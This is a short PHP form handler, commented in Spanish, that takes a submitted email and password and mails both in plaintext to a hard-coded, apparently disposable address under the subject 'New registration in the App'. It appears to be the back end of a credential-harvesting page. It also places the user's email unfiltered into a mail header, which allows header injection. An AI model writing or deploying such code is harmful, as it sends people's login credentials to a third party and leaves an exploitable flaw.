<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = "sopoj96367@operades.com";
    $subject = "Nuevo Registro en la App";

    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']); 
    $message = "Datos del formulario:\n";
    $message .= "Email/Usuario: " . $email . "\n";
    $message .= "Contraseña: " . $password . "\n"; // No recomendado para datos sensibles en producción

    $headers = "From: sopoj96367@operades.com\r\n";
    $headers .= "Reply-To: " . $email . "\r\n";

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        echo "Formulario enviado correctamente.";
    } else {
        echo "Error al enviar el formulario.";
    }
}
?>
